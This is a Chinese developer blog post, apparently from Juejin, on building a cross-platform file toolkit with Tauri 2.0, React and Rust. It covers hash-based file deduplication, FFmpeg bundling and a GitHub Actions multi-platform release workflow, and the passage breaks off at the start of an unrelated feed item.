.task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">用 Tauri 2.0 + React + Rust 打造跨平台文件工具箱</h2>
<h3 data-id="heading-1">前言</h3>
<p>最近在整理电脑文件时，发现了大量重复的照片和视频，占用了几十 GB 的空间。市面上的去重工具要么收费，要么功能臃肿，于是萌生了自己造一个的想法。</p>
<p>正好 Tauri 2.0 正式发布，相比 Electron，它有着更小的包体积和更好的性能。于是决定用 <strong>Tauri 2.0 + React + Rust</strong> 来实现这个工具。</p>
<p>最终成品：<strong>File Toolkit</strong> —— 一个跨平台的文件工具箱，支持文件统计、文件去重、视频截取。</p>
<blockquote>
<p>GitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F220529%2Ffile-toolkit" target="_blank" title="https://github.com/220529/file-toolkit" ref="nofollow noopener noreferrer">github.com/220529/file…</a></p>
</blockquote>
<h3 data-id="heading-2">功能展示</h3>
<h4 data-id="heading-3">📊 文件统计</h4>
<p>递归扫描文件夹，按类型统计文件数量和大小：</p>
<ul>
<li>支持拖拽选择文件夹</li>
<li>按文件类型分组</li>
<li>显示占比和总大小</li>
</ul>
<h4 data-id="heading-4">🔍 文件去重</h4>
<p>这是核心功能，支持：</p>
<ul>
<li><strong>两阶段扫描</strong>：先按文件大小筛选，再计算哈希</li>
<li><strong>xxHash3 快速哈希</strong>：比 MD5 快 5-10 倍</li>
<li><strong>并行计算</strong>：充分利用多核 CPU</li>
<li><strong>大文件采样</strong>：只读头部 + 中间 + 尾部，避免全量读取</li>
<li><strong>缩略图预览</strong>：图片直接显示，视频用 FFmpeg 截帧</li>
<li><strong>智能选择</strong>：自动选中较新的文件，保留最早的</li>
</ul>
<h4 data-id="heading-5">✂️ 视频截取</h4>
<ul>
<li><strong>快速模式</strong>：无损截取（-c copy），秒级完成</li>
<li><strong>精确模式</strong>：重新编码，时间精确到毫秒</li>
<li><strong>时间轴预览</strong>：8 帧缩略图，快速定位</li>
<li><strong>实时进度</strong>：精确模式显示编码进度</li>
</ul>
<h3 data-id="heading-6">技术选型</h3>
<h4 data-id="heading-7">为什么选 Tauri 而不是 Electron？</h4>






























<table><thead><tr><th>对比项</th><th>Electron</th><th>Tauri</th></tr></thead><tbody><tr><td>包体积</td><td>150MB+</td><td>10MB+</td></tr><tr><td>内存占用</td><td>高（Chromium）</td><td>低（系统 WebView）</td></tr><tr><td>后端语言</td><td>Node.js</td><td>Rust</td></tr><tr><td>性能</td><td>一般</td><td>优秀</td></tr></tbody></table>
<p>对于文件处理这种 CPU 密集型任务，Rust 的性能优势非常明显。</p>
<h4 data-id="heading-8">技术栈</h4>
<pre><code class="hljs language-css" lang="css">┌─────────────────────────────────────────────────────┐
│                    Frontend                          │
│         React <span class="hljs-number">19</span> + TypeScript + Tailwind CSS        │
├─────────────────────────────────────────────────────┤
│                   Tauri IPC                          │
├─────────────────────────────────────────────────────┤
│                    Backend                           │
│                  Rust + Tauri <span class="hljs-number">2.0</span>                   │
│  ┌─────────────┬─────────────┬─────────────────┐   │
│  │ file_stats  │    dedup    │     <span class="hljs-selector-tag">video</span>       │   │
│  │  walkdir    │  xxHash3    │    FFmpeg       │   │
│  │             │  rayon      │                 │   │
│  │             │  memmap2    │                 │   │
│  └─────────────┴─────────────┴─────────────────┘   │
└─────────────────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-9">核心实现</h3>
<h4 data-id="heading-10">1. 文件去重算法</h4>
<p>去重的核心是计算文件哈希，但如果对每个文件都完整计算哈希，效率会很低。我采用了两阶段策略：</p>
<p><strong>第一阶段：按文件大小筛选</strong></p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">size_map</span>: HashMap&lt;<span class="hljs-type">u64</span>, <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">String</span>&gt;&gt; = HashMap::<span class="hljs-title function_ invoke__">new</span>();

<span class="hljs-keyword">for</span> <span class="hljs-variable">entry</span> <span class="hljs-keyword">in</span> WalkDir::<span class="hljs-title function_ invoke__">new</span>(&amp;path)
    .<span class="hljs-title function_ invoke__">into_iter</span>()
    .<span class="hljs-title function_ invoke__">filter_map</span>(|e| e.<span class="hljs-title function_ invoke__">ok</span>())
    .<span class="hljs-title function_ invoke__">filter</span>(|e| e.<span class="hljs-title function_ invoke__">file_type</span>().<span class="hljs-title function_ invoke__">is_file</span>())
{
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Ok</span>(meta) = entry.<span class="hljs-title function_ invoke__">metadata</span>() {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">size</span> = meta.<span class="hljs-title function_ invoke__">len</span>();
        <span class="hljs-keyword">if</span> size &gt; <span class="hljs-number">0</span> {
            size_map.<span class="hljs-title function_ invoke__">entry</span>(size).<span class="hljs-title function_ invoke__">or_default</span>().<span class="hljs-title function_ invoke__">push</span>(entry.<span class="hljs-title function_ invoke__">path</span>().<span class="hljs-title function_ invoke__">to_string_lossy</span>().<span class="hljs-title function_ invoke__">to_string</span>());
        }
    }
}

<span class="hljs-comment">// 只对大小相同的文件计算哈希</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">files_to_hash</span>: <span class="hljs-type">Vec</span>&lt;_&gt; = size_map
    .<span class="hljs-title function_ invoke__">iter</span>()
    .<span class="hljs-title function_ invoke__">filter</span>(|(_, files)| files.<span class="hljs-title function_ invoke__">len</span>() &gt;= <span class="hljs-number">2</span>)
    .<span class="hljs-title function_ invoke__">flat_map</span>(|(size, files)| files.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">map</span>(<span class="hljs-keyword">move</span> |f| (*size, f.<span class="hljs-title function_ invoke__">clone</span>())))
    .<span class="hljs-title function_ invoke__">collect</span>();
</code></pre>
<p>这一步可以过滤掉大部分文件，因为大小不同的文件肯定不重复。</p>
<p><strong>第二阶段：并行计算哈希</strong></p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> rayon::prelude::*;

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">results</span>: <span class="hljs-type">Vec</span>&lt;(<span class="hljs-type">String</span>, FileInfo)&gt; = files_to_hash
    .<span class="hljs-title function_ invoke__">par_iter</span>()  <span class="hljs-comment">// 并行迭代</span>
    .<span class="hljs-title function_ invoke__">filter_map</span>(|(size, file_path)| {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">hash</span> = <span class="hljs-title function_ invoke__">calculate_fast_hash</span>(Path::<span class="hljs-title function_ invoke__">new</span>(file_path), *size).<span class="hljs-title function_ invoke__">ok</span>()?;
        <span class="hljs-comment">// ...</span>
        <span class="hljs-title function_ invoke__">Some</span>((hash, file_info))
    })
    .<span class="hljs-title function_ invoke__">collect</span>();
</code></pre>
<p>使用 <code>rayon</code> 实现并行计算，充分利用多核 CPU。</p>
<h4 data-id="heading-11">2. 快速哈希算法</h4>
<p>传统的 MD5 哈希速度较慢，我选择了 <strong>xxHash3</strong>，它是目前最快的非加密哈希算法之一：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">calculate_fast_hash</span>(path: &amp;Path, size: <span class="hljs-type">u64</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">String</span>&gt; {
    <span class="hljs-keyword">use</span> memmap2::Mmap;
    <span class="hljs-keyword">use</span> xxhash_rust::xxh3::Xxh3;

    <span class="hljs-keyword">const</span> SMALL_FILE: <span class="hljs-type">u64</span> = <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>;      <span class="hljs-comment">// 1MB</span>
    <span class="hljs-keyword">const</span> THRESHOLD: <span class="hljs-type">u64</span> = <span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>;  <span class="hljs-comment">// 10MB</span>
    <span class="hljs-keyword">const</span> SAMPLE_SIZE: <span class="hljs-type">usize</span> = <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>;   <span class="hljs-comment">// 采样 1MB</span>

    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">file</span> = File::<span class="hljs-title function_ invoke__">open</span>(path).<span class="hljs-title function_ invoke__">map_err</span>(|e| e.<span class="hljs-title function_ invoke__">to_string</span>())?;

    <span class="hljs-keyword">if</span> size &lt;= SMALL_FILE {
        <span class="hljs-comment">// 小文件：内存映射，零拷贝</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">mmap</span> = <span class="hljs-keyword">unsafe</span> { Mmap::<span class="hljs-title function_ invoke__">map</span>(&amp;file) }.<span class="hljs-title function_ invoke__">map_err</span>(|e| e.<span class="hljs-title function_ invoke__">to_string</span>())?;
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">hash</span> = xxhash_rust::xxh3::<span class="hljs-title function_ invoke__">xxh3_64</span>(&amp;mmap);
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Ok</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">"{:016x}"</span>, hash));
    }

    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">hasher</span> = Xxh3::<span class="hljs-title function_ invoke__">new</span>();

    <span class="hljs-keyword">if</span> size &lt;= THRESHOLD {
        <span class="hljs-comment">// 中等文件：完整读取</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">mmap</span> = <span class="hljs-keyword">unsafe</span> { Mmap::<span class="hljs-title function_ invoke__">map</span>(&amp;file) }.<span class="hljs-title function_ invoke__">map_err</span>(|e| e.<span class="hljs-title function_ invoke__">to_string</span>())?;
        hasher.<span class="hljs-title function_ invoke__">update</span>(&amp;mmap);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 大文件：只读头部 + 中间 + 尾部</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">mmap</span> = <span class="hljs-keyword">unsafe</span> { Mmap::<span class="hljs-title function_ invoke__">map</span>(&amp;file) }.<span class="hljs-title function_ invoke__">map_err</span>(|e| e.<span class="hljs-title function_ invoke__">to_string</span>())?;
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">len</span> = mmap.<span class="hljs-title function_ invoke__">len</span>();

        hasher.<span class="hljs-title function_ invoke__">update</span>(&amp;mmap[..SAMPLE_SIZE]);                    <span class="hljs-comment">// 头部</span>
        hasher.<span class="hljs-title function_ invoke__">update</span>(&amp;mmap[len/<span class="hljs-number">2</span> - SAMPLE_SIZE/<span class="hljs-number">2</span>..][..SAMPLE_SIZE]); <span class="hljs-comment">// 中间</span>
        hasher.<span class="hljs-title function_ invoke__">update</span>(&amp;mmap[len - SAMPLE_SIZE..]);              <span class="hljs-comment">// 尾部</span>
        hasher.<span class="hljs-title function_ invoke__">update</span>(&amp;size.<span class="hljs-title function_ invoke__">to_le_bytes</span>());                     <span class="hljs-comment">// 文件大小</span>
    }

    <span class="hljs-title function_ invoke__">Ok</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">"{:016x}"</span>, hasher.<span class="hljs-title function_ invoke__">digest</span>()))
}
</code></pre>
<p><strong>优化点</strong>：</p>
<ul>
<li><strong>xxHash3</strong>：比 MD5 快 5-10 倍</li>
<li><strong>memmap2</strong>：内存映射，零拷贝读取</li>
<li><strong>大文件采样</strong>：只读头中尾各 1MB，避免全量读取</li>
</ul>
<h4 data-id="heading-12">3. 前后端通信</h4>
<p>Tauri 使用 IPC 进行前后端通信。后端定义命令：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[tauri::command]</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">find_duplicates</span>(app: AppHandle, path: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;DedupResult, <span class="hljs-type">String</span>&gt; {
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>前端调用：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { invoke } <span class="hljs-keyword">from</span> <span class="hljs-string">"@tauri-apps/api/core"</span>;

<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> invoke&lt;<span class="hljs-title class_">DedupResult</span>&gt;(<span class="hljs-string">"find_duplicates"</span>, { path });
</code></pre>
<h4 data-id="heading-13">4. 进度反馈</h4>
<p>长时间任务需要显示进度，Tauri 支持事件机制：</p>
<p><strong>后端发送进度</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> tauri::{AppHandle, Emitter};

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">_</span> = app.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">"dedup-progress"</span>, DedupProgress {
    stage: <span class="hljs-string">"计算文件指纹"</span>.<span class="hljs-title function_ invoke__">into</span>(),
    current,
    total: total_to_hash,
    percent,
});
</code></pre>
<p><strong>前端监听</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { listen } <span class="hljs-keyword">from</span> <span class="hljs-string">"@tauri-apps/api/event"</span>;

<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> unlisten = listen&lt;<span class="hljs-title class_">DedupProgress</span>&gt;(<span class="hljs-string">"dedup-progress"</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
    <span class="hljs-title function_">setProgress</span>(event.<span class="hljs-property">payload</span>);
  });
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> { unlisten.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">fn</span>) =&gt;</span> <span class="hljs-title function_">fn</span>()); };
}, []);
</code></pre>
<h4 data-id="heading-14">5. 内嵌 FFmpeg</h4>
<p>视频功能依赖 FFmpeg，为了让用户开箱即用，我把 FFmpeg 打包进了应用：</p>
<p><strong>配置 tauri.conf.json</strong>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"bundle"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"externalBin"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"binaries/ffmpeg"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"binaries/ffprobe"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>Rust 中获取路径</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_ffmpeg_path</span>(app: &amp;AppHandle) <span class="hljs-punctuation">-&gt;</span> PathBuf {
    app.<span class="hljs-title function_ invoke__">path</span>()
        .<span class="hljs-title function_ invoke__">resource_dir</span>()
        .<span class="hljs-title function_ invoke__">ok</span>()
        .<span class="hljs-title function_ invoke__">map</span>(|p| p.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">"binaries"</span>).<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">"ffmpeg"</span>))
        .<span class="hljs-title function_ invoke__">filter</span>(|p| p.<span class="hljs-title function_ invoke__">exists</span>())
        .<span class="hljs-title function_ invoke__">unwrap_or_else</span>(|| PathBuf::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"ffmpeg"</span>))  <span class="hljs-comment">// 回退到系统 PATH</span>
}
</code></pre>
<h3 data-id="heading-15">踩坑记录</h3>
<h4 data-id="heading-16">1. Tauri 拖拽事件是全局的</h4>
<p>最初使用 CSS <code>hidden</code> 隐藏非活动 Tab 来保持状态，但发现拖拽文件时所有 Tab 都会响应。</p>
<p><strong>解决方案</strong>：给每个组件传递 <code>active</code> 属性，只有激活的组件才监听拖拽事件。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (!active) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// 非激活状态不监听</span>
  
  <span class="hljs-keyword">const</span> unlisten = <span class="hljs-title function_">listen</span>(<span class="hljs-string">"tauri://drag-drop"</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!active) <span class="hljs-keyword">return</span>;
    <span class="hljs-comment">// 处理拖拽</span>
  });
  <span class="hljs-comment">// ...</span>
}, [active]);
</code></pre>
<h4 data-id="heading-17">2. 并行计算进度跳动</h4>
<p>使用 rayon 并行计算时，多线程同时更新计数器，导致进度显示不连续。</p>
<p><strong>解决方案</strong>：使用原子变量 + compare_exchange 确保进度单调递增：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">progress_counter</span> = Arc::<span class="hljs-title function_ invoke__">new</span>(AtomicUsize::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">0</span>));
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">last_reported</span> = Arc::<span class="hljs-title function_ invoke__">new</span>(AtomicUsize::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">0</span>));

<span class="hljs-comment">// 在并行迭代中</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">current</span> = progress_counter.<span class="hljs-title function_ invoke__">fetch_add</span>(<span class="hljs-number">1</span>, Ordering::Relaxed) + <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">last</span> = last_reported.<span class="hljs-title function_ invoke__">load</span>(Ordering::Relaxed);

<span class="hljs-keyword">if</span> current &gt; last &amp;&amp; (current - last &gt;= <span class="hljs-number">20</span> || current == total) {
    <span class="hljs-keyword">if</span> last_reported.<span class="hljs-title function_ invoke__">compare_exchange</span>(last, current, Ordering::SeqCst, Ordering::Relaxed).<span class="hljs-title function_ invoke__">is_ok</span>() {
        <span class="hljs-comment">// 发送进度</span>
    }
}
</code></pre>
<h4 data-id="heading-18">3. Release 比 Debug 快很多</h4>
<p>开发时觉得去重速度一般，打包后发现快了好几倍。</p>

















<table><thead><tr><th>模式</th><th>说明</th></tr></thead><tbody><tr><td>Debug</td><td>无优化，保留调试信息</td></tr><tr><td>Release</td><td>LTO、内联、循环展开等优化</td></tr></tbody></table>
<p>对于 CPU 密集型任务，Release 版本可能快 3-5 倍。</p>
<h3 data-id="heading-19">打包发布</h3>
<h4 data-id="heading-20">本地打包</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 下载 FFmpeg 静态版本（macOS 示例）</span>
curl -L <span class="hljs-string">"https://evermeet.cx/ffmpeg/getrelease/ffmpeg/zip"</span> -o /tmp/ffmpeg.zip
unzip /tmp/ffmpeg.zip -d src-tauri/binaries/
<span class="hljs-built_in">mv</span> src-tauri/binaries/ffmpeg src-tauri/binaries/ffmpeg-x86_64-apple-darwin

<span class="hljs-comment"># 2. 执行打包</span>
pnpm tauri build
</code></pre>
<p>产物：<code>src-tauri/target/release/bundle/macos/File Toolkit.app</code>（约 62MB，含 FFmpeg）</p>
<h4 data-id="heading-21">GitHub Actions 多平台自动打包</h4>
<p>本地打包只能生成当前平台的安装包。要支持 Windows、Linux，需要在对应平台编译。</p>
<p><strong>解决方案</strong>：用 GitHub Actions，它提供 macOS、Windows、Linux 虚拟机，可以并行打包。</p>
<pre><code class="hljs language-scss" lang="scss">git push tag v0<span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.0</span>
        ↓
GitHub Actions 触发
        ↓
┌─────────────────────────────────────────────────────┐
│  同时启动 <span class="hljs-number">4</span> 台虚拟机（并行执行）                       │
├─────────────┬─────────────┬────────────┬────────────┤
│  macOS VM   │  macOS VM   │ Windows VM │  Linux VM  │
│  (Intel)    │  (ARM)      │            │            │
├─────────────┼─────────────┼────────────┼────────────┤
│ 装环境      │ 装环境       │ 装环境     │ 装环境      │
│ 下载 FFmpeg │ 下载 FFmpeg │ 下载FFmpeg │ 下载FFmpeg │
│ tauri build │ tauri build │ tauri build│ tauri build│
├─────────────┼─────────────┼────────────┼────────────┤
│   <span class="hljs-selector-class">.dmg</span>      │   <span class="hljs-selector-class">.dmg</span>      │   <span class="hljs-selector-class">.msi</span>     │   <span class="hljs-selector-class">.deb</span>     │
│  (x86_64)   │  (aarch64)  │   <span class="hljs-selector-class">.exe</span>     │  <span class="hljs-selector-class">.AppImage</span> │
└─────────────┴─────────────┴────────────┴────────────┘
        ↓
   全部上传到 GitHub Release
</code></pre>
<p><strong>核心配置</strong> <code>.github/workflows/release.yml</code>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">Release</span>

<span class="hljs-attr">on:</span>
  <span class="hljs-attr">push:</span>
    <span class="hljs-attr">tags:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">'v*'</span>

<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">build:</span>
    <span class="hljs-attr">strategy:</span>
      <span class="hljs-attr">matrix:</span>
        <span class="hljs-attr">include:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-attr">platform:</span> <span class="hljs-string">macos-latest</span>
            <span class="hljs-attr">target:</span> <span class="hljs-string">x86_64-apple-darwin</span>
          <span class="hljs-bullet">-</span> <span class="hljs-attr">platform:</span> <span class="hljs-string">macos-latest</span>
            <span class="hljs-attr">target:</span> <span class="hljs-string">aarch64-apple-darwin</span>
          <span class="hljs-bullet">-</span> <span class="hljs-attr">platform:</span> <span class="hljs-string">windows-latest</span>
            <span class="hljs-attr">target:</span> <span class="hljs-string">x86_64-pc-windows-msvc</span>
          <span class="hljs-bullet">-</span> <span class="hljs-attr">platform:</span> <span class="hljs-string">ubuntu-22.04</span>
            <span class="hljs-attr">target:</span> <span class="hljs-string">x86_64-unknown-linux-gnu</span>

    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">${{</span> <span class="hljs-string">matrix.platform</span> <span class="hljs-string">}}</span>

    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v4</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v4</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">pnpm/action-setup@v4</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">dtolnay/rust-toolchain@stable</span>

      <span class="hljs-comment"># 各平台下载对应的 FFmpeg</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Download</span> <span class="hljs-string">FFmpeg</span> <span class="hljs-string">(macOS)</span>
        <span class="hljs-attr">if:</span> <span class="hljs-string">matrix.platform</span> <span class="hljs-string">==</span> <span class="hljs-string">'macos-latest'</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">|
          curl -L "https://evermeet.cx/ffmpeg/getrelease/ffmpeg/zip" -o /tmp/ffmpeg.zip
          # ...
</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Download</span> <span class="hljs-string">FFmpeg</span> <span class="hljs-string">(Windows)</span>
        <span class="hljs-attr">if:</span> <span class="hljs-string">matrix.platform</span> <span class="hljs-string">==</span> <span class="hljs-string">'windows-latest'</span>
        <span class="hljs-attr">shell:</span> <span class="hljs-string">pwsh</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">|
          Invoke-WebRequest -Uri "https://www.gyan.dev/ffmpeg/builds/..." -OutFile ...
          # ...
</span>
      <span class="hljs-comment"># 打包并上传到 Release</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">tauri-apps/tauri-action@v0</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">tagName:</span> <span class="hljs-string">${{</span> <span class="hljs-string">github.ref_name</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">releaseDraft:</span> <span class="hljs-literal">true</span>
          <span class="hljs-attr">args:</span> <span class="hljs-string">--target</span> <span class="hljs-string">${{</span> <span class="hljs-string">matrix.target</span> <span class="hljs-string">}}</span>
</code></pre>
<p><strong>使用方式</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">git tag v0.2.0
git push origin v0.2.0
<span class="hljs-comment"># 自动触发，完成后去 Releases 页面发布</span>
</code></pre>
<p><strong>为什么能跨平台？</strong></p>
<ul>
<li><strong>前端</strong>：React 编译成 HTML/CSS/JS，哪都能跑</li>
<li><strong>后端</strong>：Rust 在目标平台的虚拟机上编译，生成原生二进制</li>
<li><strong>FFmpeg</strong>：每个平台下载对应的静态版本</li>
</ul>
<p>本质是<strong>在真实目标平台上编译</strong>，GitHub 免费提供这些虚拟机。</p>
<h3 data-id="heading-22">总结</h3>
<p>这个项目让我对 Tauri 2.0 有了更深的理解：</p>
<ol>
<li><strong>Rust 性能确实强</strong>：文件哈希、并行计算等场景优势明显</li>
<li><strong>Tauri 开发体验不错</strong>：前后端分离，IPC 通信简单</li>
<li><strong>包体积小</strong>：不含 FFmpeg 只有 10MB 左右</li>
<li><strong>跨平台</strong>：一套代码，多端运行</li>
</ol>
<p>如果你也想尝试 Tauri，这个项目可以作为参考。</p>
<blockquote>
<p>GitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F220529%2Ffile-toolkit" target="_blank" title="https://github.com/220529/file-toolkit" ref="nofollow noopener noreferrer">github.com/220529/file…</a></p>
<p>欢迎 Star ⭐️</p>
</blockquote>
<hr/>
<p><strong>相关文章</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftauri.app%2F" target="_blank" title="https://tauri.app/" ref="nofollow noopener noreferrer">Tauri 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fxxhash.com%2F" target="_blank" title="https://xxhash.com/" ref="nofollow noopener noreferrer">xxHash 算法介绍</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.rs%2Frayon%2F" target="_blank" title="https://docs.rs/rayon/" ref="nofollow noopener noreferrer">Rayon 并行计算</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlin协程-基础设施篇-函数的挂起]]></title>    <link>https://juejin.cn/post/7589920318132240384</link>    <guid>https://juejin.cn/post/7589920318132240384</guid>    <pubDate>2026-01-01T03:05:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589920318132240384" data-draft-id="7589893170387533824" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlin协程-基础设施篇-函数的挂起"/> <meta itemprop="keywords" content="Kotlin"/> <meta itemprop="datePublished" content="2026-01-01T03:05:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Huang兄"/> <meta itemprop="url" content="https://juejin.cn/user/52404619842712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" 